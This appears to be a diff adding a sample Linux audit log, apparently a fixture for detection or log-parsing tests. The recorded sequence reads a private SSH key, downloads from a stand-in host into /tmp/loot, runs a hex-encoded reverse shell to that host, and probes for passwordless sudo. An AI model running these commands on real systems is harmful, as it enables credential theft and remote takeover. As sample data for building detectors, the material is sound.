@@ -1,0 +1,14 @@
+type=SYSCALL msg=audit(1626611363.720:348): arch=c000003e syscall=59 success=yes exit=0 ppid=1200 pid=1234 auid=1000 uid=1000 gid=1000 comm="cat" exe="/usr/bin/cat" key=(null)
+type=EXECVE msg=audit(1626611363.720:348): argc=2 a0="cat" a1="/home/u/.ssh/id_rsa"
+type=CWD msg=audit(1626611363.720:348): cwd="/home/u"
+type=PATH msg=audit(1626611363.720:348): item=0 name="/home/u/.ssh/id_rsa" inode=42 nametype=NORMAL
+type=PROCTITLE msg=audit(1626611363.720:348): proctitle=636174002F686F6D652F752F2E7373682F69645F727361
+type=SYSCALL msg=audit(1626611364.000:349): arch=c000003e syscall=59 success=yes exit=0 ppid=1200 pid=1240 auid=1000 uid=1000 comm="curl" exe="/usr/bin/curl" key=(null)
+type=EXECVE msg=audit(1626611364.000:349): argc=5 a0="curl" a1="-s" a2="http://192.0.2.1/x" a3="-o" a4="/tmp/loot"
+type=CWD msg=audit(1626611364.000:349): cwd="/home/u"
+type=PROCTITLE msg=audit(1626611364.000:349): proctitle=6375726C002D730068747470...truncated
+type=SYSCALL msg=audit(1626611365.500:350): arch=c000003e syscall=59 exe="/bin/bash" auid=1000 uid=1000 comm="bash"
+type=EXECVE msg=audit(1626611365.500:350): argc=3 a0="bash" a1="-c" a2=626173682D69003E26002F6465762F7463702F3139322E302E322E312F34343434
+type=SYSCALL msg=audit(1626611366.000:351): arch=c000003e syscall=59 exe="/usr/bin/sudo" auid=1000 uid=1000 comm="sudo"
+type=EXECVE msg=audit(1626611366.000:351): argc=3 a0="sudo" a1="-n" a2="true"
+type=EOE msg=audit(1626611366.000:351):
